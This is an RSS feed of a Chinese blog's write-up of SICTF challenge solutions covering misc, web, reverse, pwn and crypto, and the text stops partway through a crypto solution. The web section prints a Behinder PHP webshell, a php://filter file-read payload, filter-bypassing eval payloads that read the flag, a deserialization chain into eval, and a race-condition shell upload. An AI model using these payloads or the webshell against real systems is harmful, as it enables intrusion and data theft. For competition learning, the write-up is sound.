<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title> • Posts by &#34;write_up&#34; category</title>
        <link>http://example.com</link>
        <description>欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</description>
        <language>zh-CN</language>
        <pubDate>Sun, 10 Sep 2023 19:48:34 +0800</pubDate>
        <lastBuildDate>Sun, 10 Sep 2023 19:48:34 +0800</lastBuildDate>
        <category>wp</category>
        <category>canary</category>
        <category>csu</category>
        <category>rop</category>
        <category>gdb</category>
        <category>堆</category>
        <category>pie</category>
        <category>格式化字符串漏洞</category>
        <category>格式化字符串</category>
        <category>got表</category>
        <category>srop</category>
        <category>uaf</category>
        <category>unlink</category>
        <category>got改写</category>
        <category>随机数检查</category>
        <item>
            <guid isPermalink="true">http://example.com/2023/09/10/sictf-wp/</guid>
            <title>sictf_wp</title>
            <link>http://example.com/2023/09/10/sictf-wp/</link>
            <category>wp</category>
            <pubDate>Sun, 10 Sep 2023 19:48:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;misc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; MISC&lt;/h1&gt;
&lt;h3 id=&#34;签到welcome&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#签到welcome&#34;&gt;#&lt;/a&gt; 签到] Welcome&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;pixel_art&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pixel_art&#34;&gt;#&lt;/a&gt; Pixel_art&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;from PIL import Image
image = Image.open(&#39;image.png&#39;)
width, height = image.size
for y in range(height):
    for x in range(width):
        r, g, b = image.getpixel((x, y))
        if r == 46:
            print(&#39;.&#39;,end=&amp;quot;&amp;quot;)
        elif r == 33:
            print(&#39;!&#39;,end=&amp;quot;&amp;quot;)
        elif r == 63:
            print(&#39;?&#39;,end=&amp;quot;&amp;quot;)
        if g == 46:
                print(&#39;.&#39;,end=&amp;quot;&amp;quot;)
        elif g == 33:
                print(&#39;!&#39;,end=&amp;quot;&amp;quot;)
        elif g == 63:
                print(&#39;?&#39;,end=&amp;quot;&amp;quot;)
        if b == 46:
            print(&#39;.&#39;,end=&amp;quot;&amp;quot;)
        elif b == 33:
            print(&#39;!&#39;,end=&amp;quot;&amp;quot;)
        elif b == 63:
            print(&#39;?&#39;,end=&amp;quot;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-asp&#34;&gt

 Ook
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;baby_zip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#baby_zip&#34;&gt;#&lt;/a&gt; baby_zip&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452
bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;010 查看 flag 在最后&lt;/p&gt;
&lt;h3 id=&#34;easy_shark&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easy_shark&#34;&gt;#&lt;/a&gt; Easy_Shark&lt;/h3&gt;
&lt;p&gt;AES 冰蝎 3 流量的特征&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;&amp;lt;?php
@error_reporting(0);
session_start();
    $key=&amp;quot;2295d22e2d70888f&amp;quot;;
        $_SESSION[&#39;k&#39;]=$key;
        $post=file_get_contents(&amp;quot;php://input&amp;quot;);
        if(!extension_loaded(&#39;openssl&#39;))
        &amp;#123;
                $t=&amp;quot;base64_&amp;quot;.&amp;quot;decode&amp;quot;;
                $post=$t($post.&amp;quot;&amp;quot;);
                
                for($i=0;$i&amp;lt;strlen($post);$i++) &amp;#123;
                             $post[$i] = $post[$i]^$key[$i+1&amp;amp;15]; 
                            &amp;#125;
        &amp;#125;
        else
        &amp;#123;
                $post=openssl_decrypt($post, &amp;quot;AES128&amp;quot;, $key);
        &amp;#125;
    $arr=explode(&#39;|&#39;,$post);
    $func=$arr[0];
    $params=$arr[1];
        class C&amp;#123;public function __invoke($p) &amp;#123;eval($p.&amp;quot;&amp;quot;);&amp;#125;&amp;#125;
    @call_user_func(new C(),$params);
?&amp;gt;
key = &#39;2295d22e2d70888f&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/2.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;解冰蝎流量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/5.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Gron 解密&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;def decrypt_string(ciphertext, offsets):
    decrypted_string = &amp;quot;&amp;quot;
    offset_index = 0

    for char in ciphertext:
        offset = offsets[offset_index] % 26
        decrypted_char_code = (ord(char) - ord(&#39;A&#39;) - offset) % 26 + ord(&#39;A&#39;)
        decrypted_char = chr(decrypted_char_code)
        decrypted_string += decrypted_char

        offset_index = (offset_index + 1) % len(offsets)

    return decrypted_string

ciphertext = &amp;quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&amp;quot;
offsets = [1, 50, 61, 8, 9, 20, 63, 41]

while True:
    decrypted_string = decrypt_string(ciphertext, offsets)
    print(decrypted_string)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fast_morse&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fast_morse&#34;&gt;#&lt;/a&gt; fast_morse&lt;/h3&gt;
&lt;p&gt;morse 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/6.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 falg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;变成小写&lt;/p&gt;
&lt;p&gt;flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}&lt;/p&gt;
&lt;h3 id=&#34;qr_qr_qr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#qr_qr_qr&#34;&gt;#&lt;/a&gt; QR_QR_QR&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;import numpy as np
import matplotlib.pyplot as plt
from pyzbar.pyzbar import decode
from PIL import Image
from pwn import *

# 设置日志级别为调试模式
context(log_level=&#39;debug&#39;)

# 创建图片函数
def create_image(file_path):
    with open(file_path, &#39;r&#39;) as file:
        lines = file.readlines()

    # 生成图片数组
    image_array = [[255 if bit == &#39;1&#39; else 0 for bit in line.strip()] for line in lines]
    image_array = np.array(image_array, dtype=np.uint8)

    # 保存为图片
    plt.imsave(&#39;output.png&#39;, image_array, cmap=&#39;gray&#39;)

# 读取二维码函数
def read_qr_code(image_path):
    image = Image.open(image_path)
    decoded_objects = decode(image)
    for obj in decoded_objects:
        return obj.data.decode(&#39;utf-8&#39;)

# 连接服务器
conn = remote(&#39;210.44.151.51&#39;, 10523)

while True:
    try:
        # 从服务器接收数据
        data = conn.recvuntil(&#39;Please Decrypt this QR code:&#39;, drop=True)

        # 将数据保存到文本文件
        with open(&#39;1.txt&#39;, &#39;w&#39;) as file:
            file.write(data.decode())

        # 从文本文件创建图片
        create_image(&#39;1.txt&#39;)

        # 读取图片中的二维码
        code = read_qr_code(&#39;output.png&#39;)
        print(code)

        # 发送二维码到服务器
        conn.sendline(str(code))
        conn.recvline()
    finally:
        # 关闭文件
        file.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;问卷调查&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#问卷调查&#34;&gt;#&lt;/a&gt; 问卷调查&lt;/h3&gt;
&lt;p&gt;第三道就是 flag&lt;/p&gt;
&lt;p&gt;SICTF SICTF_Round3_will_do_even_better!}&lt;/p&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; WEB&lt;/h1&gt;
&lt;h3 id=&#34;签到include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#签到include&#34;&gt;#&lt;/a&gt; [签到] Include&lt;/h3&gt;
&lt;p&gt;利用伪协议可直接读到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;    /?SICTF=php://filter/convert.base64-encode/resource=/flag
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;baby_php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#baby_php&#34;&gt;#&lt;/a&gt; Baby_PHP&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);

$query = $_SERVER[&#39;QUERY_STRING&#39;];

if (preg_match(&#39;/_|%5f|\.|%2E/i&#39;, $query)) &amp;#123;
    die(&#39;You are Hacker!&#39;);
&amp;#125;
if($_GET[&#39;k_e_y&#39;] !==&#39;123&#39; &amp;amp;&amp;amp; preg_match(&#39;/^123$/&#39;,$_GET[&#39;k_e_y&#39;]))&amp;#123;
    echo(&amp;quot;You are will Win!&amp;lt;br&amp;gt;&amp;quot;);
    if(isset($_POST[&#39;command&#39;]))&amp;#123;
        $command = $_POST[&#39;command&#39;];
        if(!preg_match(&amp;quot;/\~|\`|\@|\#|\\$|\%|\&amp;amp;|\*|\（|\）|\-|\+|\=|\&amp;#123;|\&amp;#125;|\[|\]|\:|\&#39;|\&amp;quot;|\,|\&amp;lt;|\.|\&amp;gt;|\/|\?|\\\\/i&amp;quot;,$command))&amp;#123;
            eval($command);
        &amp;#125;
        else&amp;#123;
            echo(&amp;quot;You are Hacker!&amp;quot;);
        &amp;#125;
    &amp;#125;
&amp;#125;
else&amp;#123;
    echo(&amp;quot;K_e_y is Errors!&amp;quot;);
&amp;#125;K_e_y is Errors!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤&lt;/p&gt;
&lt;p&gt;可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过&lt;/p&gt;
&lt;p&gt;后面 cmd 一个无数字字母 rce&lt;/p&gt;
&lt;p&gt;可见 ctfshow  web40 的题解&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-Plain&#34;&gt;/?k%20e%20y=123%0a
command=show_source(next(array_reverse(scandir(pos(localeconv())))));
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Plain&#34;&gt;&amp;lt;?php 
error_reporting(0); 
highlight_file(__FILE__); 
$code = $_POST[&#39;code&#39;]; 
$code = str_replace(&amp;quot;(&amp;quot;,&amp;quot;hacker&amp;quot;,$code); 
$code = str_replace(&amp;quot;.&amp;quot;,&amp;quot;hacker&amp;quot;,$code); 
eval($code); 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;借鉴宏爷文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=&#34;&gt;https://blog.csdn.net/qq_63928796/article/details/127963079&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;code=echo $_POST[1];&amp;amp;1=cat /f*
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;我全都要&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#我全都要&#34;&gt;#&lt;/a&gt; 我全都要&lt;/h3&gt;
&lt;p&gt;POP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);

class B&amp;#123;
    public $pop = &#39;233333333&#39;;
    public $i = &#39;1&#39;;
    public $nogame;

    public function __destruct()
    &amp;#123;
        if(preg_match(&amp;quot;/233333333/&amp;quot;,$this-&amp;gt;pop))&amp;#123;
            echo &amp;quot;这是一道签到题，不能让新生一直做不出来遭受打击&amp;quot;;
        &amp;#125;
    &amp;#125;

    public function game()&amp;#123;
        echo &amp;quot;扣1送地狱火&amp;quot;;
        if ($this-&amp;gt;i = &amp;quot;1&amp;quot;)&amp;#123;
            echo &#39;&amp;lt;img src=\&#39;R.jpg\&#39;&amp;gt;&#39;;
            $this-&amp;gt;nogame-&amp;gt;love();
        &amp;#125;
    &amp;#125;

    public function __clone()&amp;#123;
        echo &amp;quot;必须执行&amp;quot;;
        eval($_POST[&amp;quot;cmd&amp;quot;]);
    &amp;#125;
&amp;#125;


class A&amp;#123;
    public $Aec;
    public $girl = &#39;QNKCDZO&#39; ;
    public $boy = &#39;240610708&#39;;

    public function __toString()
    &amp;#123;
        echo &amp;quot;I also want to fall in love&amp;quot;;
        if($this-&amp;gt;girl != $this-&amp;gt;boy &amp;amp;&amp;amp; md5($this-&amp;gt;girl) == md5($this-&amp;gt;boy))&amp;#123;
            $this-&amp;gt;Aec-&amp;gt;game();
        &amp;#125;
    &amp;#125;


&amp;#125;


class P&amp;#123;
    public $MyLover;
    public $name = &#39;1&#39;;
    public function __call($name, $arguments)
    &amp;#123;
        echo &amp;quot;有对象我会在这打CTF???看我克隆一个对象！&amp;quot;;
        if ($name != &amp;quot;game&amp;quot;) &amp;#123;
            echo &amp;quot;打游戏去，别想着对象了&amp;quot;;
            $this-&amp;gt;MyLover = clone new B;
        &amp;#125;
    &amp;#125;


&amp;#125;
$a = new B();
$a -&amp;gt;pop = new A();
$a -&amp;gt;pop -&amp;gt;Aec = new B();
$a -&amp;gt;pop -&amp;gt;Aec -&amp;gt; nogame = new P();
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后命令执行&lt;/p&gt;
&lt;p&gt;cmd=&lt;/p&gt;
&lt;h3 id=&#34;你能跟得上我的speed吗&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#你能跟得上我的speed吗&#34;&gt;#&lt;/a&gt; 你能跟得上我的 speed 吗&lt;/h3&gt;
&lt;p&gt;条件竞争&lt;/p&gt;
&lt;p&gt;准备一个 php 文件&lt;/p&gt;
&lt;p&gt;内容为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval(system(&amp;quot;cat /flag&amp;quot;));?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;抓两个包&lt;/p&gt;
&lt;p&gt;一个为 get 传参的包，访问 url/uploads/2.php, 抓包&lt;/p&gt;
&lt;p&gt;另一个为 post 包，直接就抓上传的包，如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;俩个包用 burp 爆破，爆破方式为 noplayload，开跑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;re&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re&#34;&gt;#&lt;/a&gt; Re&lt;/h1&gt;
&lt;h3 id=&#34;签到pyc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#签到pyc&#34;&gt;#&lt;/a&gt; [签到] PYC&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/10.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;myobject&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#myobject&#34;&gt;#&lt;/a&gt; Myobject&lt;/h3&gt;
&lt;p&gt;动调出数据，直接赛博厨子秒了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/11.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;chbase&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chbase&#34;&gt;#&lt;/a&gt; chbase&lt;/h3&gt;
&lt;p&gt;换表加密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/12.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/13.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/14.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;不一样的base64&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不一样的base64&#34;&gt;#&lt;/a&gt; 不一样的 base64&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;BASE64_CHARS = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;

def base64_decode(encoded_data):
    decoded_data = &#39;&#39;
    padding_count = encoded_data.count(&#39;=&#39;)
    encoded_data = encoded_data.replace(&#39;=&#39;, &#39;&#39;)

    binary_str = &#39;&#39;
    for char in encoded_data:
        decimal_val = BASE64_CHARS.index(char)
        binary_str += format(decimal_val, &#39;06b&#39;)

    if padding_count &amp;gt; 0:
        binary_str = binary_str[:-padding_count * 2]

    for i in range(0, len(binary_str), 8):
        byte = binary_str[i:i + 8]
        decoded_data += chr(int(byte, 2))

    return decoded_data

encoded_data = input(&#39;&#39;)
decoded_data = base64_decode(encoded_data)
print(decoded_data)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; Pwn&lt;/h1&gt;
&lt;h3 id=&#34;签到shop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#签到shop&#34;&gt;#&lt;/a&gt; [签到] Shop&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/15.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;crypto&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;h3 id=&#34;古典大杂烩&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#古典大杂烩&#34;&gt;#&lt;/a&gt; 古典大杂烩&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;emjio 解密&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/16.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;radio&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#radio&#34;&gt;#&lt;/a&gt; Radio&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/17.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;easy_coppersmith&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easy_coppersmith&#34;&gt;#&lt;/a&gt; Easy_CopperSmith&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;from sage.all import *
import binascii
from Crypto.Util.number import *

n =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381
cipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810

e2 = 0x10001
pbits = 512
for i in range(0,2**4):
    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590
    p4=p4+int(hex(i),16)
    print(hex(p4))
    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数
    print(p4.nbits())
    p4 = p4 &amp;lt;&amp;lt; kbits
    PR.&amp;lt;x&amp;gt; = PolynomialRing(Zmod(n))
    f = x + p4
    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破
    #print roots
    if roots:        #爆破成功，求根
        p = p4+int(roots[0])
        print(&amp;quot;p: &amp;quot;, hex(int(p)))
        assert n % p == 0
        q = n/int(p)
        print(&amp;quot;q: &amp;quot;, hex(int(q)))
        print(gcd(p,q))
        phin = (p-1)*(q-1)
        print(gcd(e2,phin))
        d = inverse_mod(e2,phin)
        print(&amp;quot;d：&amp;quot;,d)
        flag = pow(cipher,d,n)
        flag = hex(int(flag))[2:]
        result = &amp;quot;&amp;quot;
        for i in range(0, len(flag), 2):
            hex_int = int(flag[i:i+2], 16)  # 转换为整数
            result += chr(hex_int)  # 转换为字符并拼接到结果字符串
        print(&#39;result :&#39;,result)
        
# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;mingtianpao&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mingtianpao&#34;&gt;#&lt;/a&gt; MingTianPao&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;import codecs
import numpy as np

def is_character(x):
    return ord(&#39;a&#39;) &amp;lt;= x &amp;lt;= ord(&#39;z&#39;) or ord(&#39;A&#39;) &amp;lt;= x &amp;lt;= ord(&#39;Z&#39;)

def xor_strings(s1, s2):
    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])

def infer_space(index, pos):
    if message[index, pos] != 0:
        return
    message[index, pos] = ord(&#39; &#39;)
    for x in range(len(ciphertexts)):
        if x != index:
            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(&#39; &#39;)

def find_spaces():
    for index, x in enumerate(ciphertexts):
        res = [xor_strings(x, y) for y in ciphertexts if x != y]
        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))
        cnt = [f(pos) for pos in range(len(x))]
        for pos in range(len(x)):
            space_data.append((f(pos), index, pos))

with open(&#39;222.txt&#39;, &#39;r&#39;) as file:
    ciphertexts = [codecs.decode(x.strip().encode(), &#39;hex&#39;) for x in file.readlines()]

message = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)

space_data = []

find_spaces()

space_data = sorted(space_data, reverse=True)
for weight, index, pos in space_data:
    infer_space(index, pos)

print(&#39;\n&#39;.join([&#39;&#39;.join([chr(c) for c in x]) for x in message]))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;amp;n dmother liz ou8 in the&amp;quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&amp;quot;Hoo# entered thi od? a wolf&amp;quot;cam&amp;quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;hex_str1 = &amp;quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&amp;quot;
hex_str2 = &amp;quot;Little Red Riding Hood promised&amp;quot;

bytes1 = bytes.fromhex(hex_str1)
bytes2 = bytes(hex_str2, &#39;utf-8&#39;)

result = bytes([a ^ b for a, b in zip(bytes1, bytes2)])

result_str = result.decode(&#39;utf-8&#39;)
print(result_str)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;small_e&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#small_e&#34;&gt;#&lt;/a&gt; small_e&lt;/h3&gt;
&lt;p&gt;低指数加密 /m 高位攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/sictfpic/18.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;def phase2(high_m, n, c,e):
    R.&amp;lt;x&amp;gt; = PolynomialRing(Zmod(n), implementation=&#39;NTL&#39;)
    m = high_m + x
    M = m((m^e - c).small_roots()[0])
    hex_str = hex(int(M))[2:]
    print(hex_str)
    return hex_str

n = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797
c = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181
high_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592
e = 3

hex_str = phase2(high_m, n, c,e)
# 将16进制字符串转换为整数
int_value = Integer(&#39;0x&#39; + hex_str)

# 将整数拆分为多个字节，并转换为对应的ASCII字符
str_value = &#39;&#39;.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))

print(str_value)

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;签到题来咯&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#签到题来咯&#34;&gt;#&lt;/a&gt; 签到题来咯！&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;import libnum
import binascii
from  Crypto.Util.number import *
n = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883
c1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520
